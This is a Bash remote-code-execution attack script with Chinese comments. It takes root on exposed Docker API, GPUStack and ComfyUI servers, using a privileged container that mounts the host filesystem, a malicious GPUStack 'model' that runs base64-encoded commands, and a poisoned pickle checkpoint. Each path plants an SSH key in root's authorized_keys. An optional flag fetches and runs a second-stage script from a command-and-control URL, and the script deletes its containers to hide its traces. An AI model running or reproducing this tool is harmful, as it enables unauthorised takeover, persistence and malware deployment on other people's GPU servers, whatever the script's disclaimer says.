#!/bin/bash
# svc_rce.sh v2.6 — C线服务RCE 真载荷（把实战验证过的 root 链模板化，一键打）
# v2.6: 密钥统一 base64 注入（引号炸弹解药）+ DL 下载竞态修复
# 免责: 仅用于已授权目标。实战来源: 3090舰队/5090/V100 夺 root 复盘。
# 用法:
#   ./svc_rce.sh <ip> <port> <type> [--key <pub>] [--deploy <c2>]
#     type: docker | gpustack | comfy | auto
#   --key '<ssh公钥>'     打完后写入目标 /root/.ssh/authorized_keys
#   --deploy <c2-url>     root 后自动下载布毒牙（curl C2/v21.sh | 执行），夺一条链走
# AUTO: 按 docker(2375) → gpustack(30003) → comfy(8188) 顺序探测，中一个打一个
set -u
TARGET="${1:-}"; PORT="${2:-}"; TYPE="${3:-auto}"; KEY=""; DEPLOY=""
while [ $# -gt 0 ]; do
  case "$1" in
    --key) KEY="$2"; shift 2;;
    --deploy) DEPLOY="$2"; shift 2;;
    -*) shift;;
    *) shift;;
  esac
done
TARGET="${TARGET:-}"; PORT="${PORT:-}"
[ -z "$TARGET" ] && { echo "用法: $0 <ip> <port> <docker|gpustack|comfy|auto> [--key pub] [--deploy c2]"; exit 1; }
ok(){ echo "[+] $*"; }
no(){ echo "[-] $*"; }
hit(){ echo "[!] $*"; }
log(){ echo "[*] $*"; }

# 默认播种自己的公钥
if [ -z "$KEY" ]; then
  KEY=$(cat /root/.ssh/*.pub 2>/dev/null | head -1)
fi
# 打完自动布毒牙的载荷块（夺 root + 扎根一条龙）
DL=""
if [ -n "$DEPLOY" ]; then
  # v2.6: 子shell串行 + 三态下载（curl→wget→python），修 &后rm 抢跑
  DL="{ U=${DEPLOY}/v21.sh; (command -v curl >/dev/null 2>&1 && curl -s -m 40 -o /tmp/.zz.sh \"\$U\" 2>/dev/null) || (command -v wget >/dev/null 2>&1 && wget -q -T 40 -O /tmp/.zz.sh \"\$U\" 2>/dev/null) || (python3 -c \"import urllib.request;urllib.request.urlretrieve('\$U','/tmp/.zz.sh')\" 2>/dev/null); [ -s /tmp/.zz.sh ] && bash /tmp/.zz.sh >/dev/null 2>&1; rm -f /tmp/.zz.sh; } &"
  log "启用 --deploy: root 后自动拉 $DEPLOY/v21.sh 布毒牙"
fi
# v2.6: KEY base64 安全形态（引号/空格/管道全不破）
KEYB64=$(printf '%s' "$KEY" | base64 -w0 2>/dev/null)

## ================= docker (2375 未认证 / docker.sock / docker 组) =================
pwn_docker_api(){ # ip:port
  local H="$1"
  local info; info=$(curl -s -m 8 "$H/info" 2>/dev/null)
  echo "$info" | grep -qi docker || { no "docker API 无响应/需认证"; return 1; }
  hit "Docker API 未认证: $H"
  local VER=$(echo "$info" | grep -oE '"ServerVersion":"[^"]*"' | head -1)
  log "server $VER"
  # 特权容器 + 挂载宿主 / → 写 AK + 锁死
  if [ -n "$KEY" ]; then
    # v2.6: KEY base64 注入，单引号/空格不破
    local CMD="mkdir -p /host/root/.ssh; echo $KEYB64|base64 -d >> /host/root/.ssh/authorized_keys; chmod 700 /host/root/.ssh"
    [ -n "$DL" ] && CMD="$CMD; $DL"
    local PAY="{\"Image\":\"alpine:latest\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true},\"Cmd\":[\"sh\",\"-c\",\"$CMD\"],\"Tty\":false}"
    local CID; CID=$(curl -s -m 10 -X POST "$H/containers/create" -H 'Content-Type: application/json' -d "$PAY" 2>/dev/null | grep -oE '"Id":"[a-f0-9]{64}"' | cut -d'"' -f4)
    if [ -n "$CID" ]; then
      curl -s -m 10 -X POST "$H/containers/$CID/start" >/dev/null 2>&1
      sleep 2; curl -s -m 5 -X DELETE "$H/containers/$CID?force=1" >/dev/null 2>&1   # 自毁容器消痕
      hit "载荷容器已执行并自毁 | AK 已播种 -> root 可达"
      return 0
    else
      no "容器创建被拒（可能 API 半开/镜像拉取失败）"
    fi
  fi
  return 1
}
pwn_docker_sock(){ # 本机 docker.sock 逃逸（docker 组 / 挂载 sock）
  [ -S /var/run/docker.sock ] || { no "无 docker.sock"; return 1; }
  local DOCKER=; command -v docker >/dev/null 2>&1 && DOCKER=docker
  if [ -n "$DOCKER" ]; then
    $DOCKER run --rm -v /:/host alpine chroot /host sh -c "mkdir -p /root/.ssh; [ -n '$KEY' ] && echo $KEYB64|base64 -d >> /root/.ssh/authorized_keys" 2>/dev/null \
      && hit "docker.sock 逃逸成功: 宿主 root" && return 0
  else
    # 无 docker CLI → 走 API
    pwn_docker_api "unix:///var/run/docker.sock" 2>/dev/null || { log "无 docker CLI，用 curl: $PWN"; }
  fi
  return 1
}

## ================= GPUStack (v2/models 恶意"模型" = 任意容器 RCE) =================
pwn_gpustack(){ # ip:port
  local H="$1"
  curl -s -m 8 "$H/v2/models" 2>/dev/null | grep -qi "data" || { no "GPUStack 无响应或需认证"; return 1; }
  hit "GPUStack 未认证: $H"
  # 恶意模型 = python 镜像 + run_command（实战链路：骗过显存调度拿 GPU 配额执行载荷）
  # base64 传公钥（避免单引号嵌套破功）
  local KB=""; command -v base64 >/dev/null 2>&1 && KB=$(printf '%s' "$KEY" | base64 -w0 2>/dev/null)
  local CMD="id > /tmp/gstk.log; hostname >> /tmp/gstk.log"
  if [ -n "$KEY" ]; then
    [ -n "$KB" ] && CMD="$CMD; mkdir -p /root/.ssh; echo $KB|base64 -d >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys" \
               || CMD="$CMD; mkdir -p /root/.ssh; echo '$KEY' >> /root/.ssh/authorized_keys"
  fi
  [ -n "$DL" ] && CMD="$CMD; $DL"
  # v2.6: 命令整体 b64 化进 run_command（CMD 内含 DL 的括号/引号也不破）
  local CMD_B64=$(printf '%s' "$CMD" | base64 -w0 2>/dev/null)
  local PAY="{\"name\":\"p1\",\"description\":\"p1\",\"replicas\":1,\"placement_strategy\":\"spread\",\"source\":\"model_scope\",\"model_scope_model_id\":\"Qwen/Qwen3-0.6B\",\"image\":\"python:3.11-slim\",\"gpu_indexes\":[0],\"run_command\":\"bash -c 'python3 -c \\\"import base64;exec(base64.b64decode(\\\"$CMD_B64\\\").decode())\\\"'\"}"
  local R; R=$(curl -s -m 15 -X POST "$H/v2/models" -H 'Content-Type: application/json' -d "$PAY" 2>/dev/null)
  echo "$R" | grep -q '"id"' && hit "恶意模型已创建: $(echo "$R" | grep -oE '\\"id\\":\\"[^\\"]*\\"' | head -1)" || log "API 返回: $(echo "$R" | head -c 200)"
  # 等落地后验证
  sleep 8
  curl -s -m 8 "$H/v2/models" 2>/dev/null | grep -q "p1" && hit "p1 模型在线" || warn "模型状态待确认（GPU 调度慢时需再等）"
  return 0
}

## ================= ComfyUI (pickle 上传 + StringFormat dlopen 回读) =================
pwn_comfy(){ # ip:port
  local H="$1"
  local FP; FP=$(curl -s -m 8 "$H/internal/folder_paths" 2>/dev/null)
  {
    echo "$FP" | grep -q '"checkpoints"'
  } || { no "ComfyUI 无响应/路径接口关闭"; return 1; }
  hit "ComfyUI 在线: $H"
  # root 判定: folder 里含 /root/ → root 运行
  echo "$FP" | grep -q '/root/' && hit "ComfyUI 以 ROOT 运行（免提权直接种）" || log "非 root 运行（需叠加提权，见 kernel_lpe.sh）"
  # 1) pickle 载荷上传（checkpoint 槽位）—— v2.6: KEY base64 注入
  local PP="mkdir -p /root/.ssh; echo $KEYB64|base64 -d >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys"
  [ -n "$DL" ] && PP="$PP; $DL"
  local TMP=$(mktemp /tmp/tmpckptXXXXXX.ckpt 2>/dev/null || mktemp /tmp/tmpckpt.ckpt)
  python3 "$(dirname "$0")/mk_pickle.py" "$TMP" "$PP" >/dev/null 2>&1
  local UP; UP=$(curl -s -m 15 -F "image=@$TMP" -F "subfolder=" -F "type=output" -F "overwrite=true" "$H/upload/image" 2>/dev/null)
  echo "$UP" | grep -q '"name"' && hit "pickle 已入输出槽: $(echo "$UP" | grep -oE '\\"name\\":\\"[^\\"]*\\"' | head -1)" || log "上传响应: $(echo "$UP" | head -c 150)"
  rm -f "$TMP"
  log "触发: webui/comfy 前端加载该 ckpt（Load Checkpoint 选择）即执行 AK 播种"
  log "若该机装了 StringFormat 节点（GLOBAL 技巧）：可改为 dlopen 链直接回读命令输出"
  return 0
}

## ================= 分发 =================
case "$TYPE" in
  docker)   pwn_docker_sock;;
  gpustack) pwn_gpustack "$TARGET:$PORT";;
  comfy)    pwn_comfy "$TARGET:$PORT";;
  auto)
    # 2375
    if curl -s -m 5 "http://$TARGET:$PORT/info" 2>/dev/null | grep -qi docker; then pwn_docker_api "http://$TARGET:$PORT"
    else
      # 30003 gpustack
      if curl -s -m 5 "$TARGET:$PORT/v2/models" 2>/dev/null | grep -q data; then pwn_gpustack "$TARGET:$PORT"
      else
        # 8188 comfy
        if [ "$PORT" = 8188 ] || curl -s -m 5 "$TARGET:$PORT/internal/folder_paths" 2>/dev/null | grep -q checkpoints; then pwn_comfy "$TARGET:$PORT"
        else no "auto 三线全无响应（试人工: comfy 的 /api/predict、ollama 11434）"; fi
      fi
    fi
    ;;
esac
echo "===== svc_rce done ====="
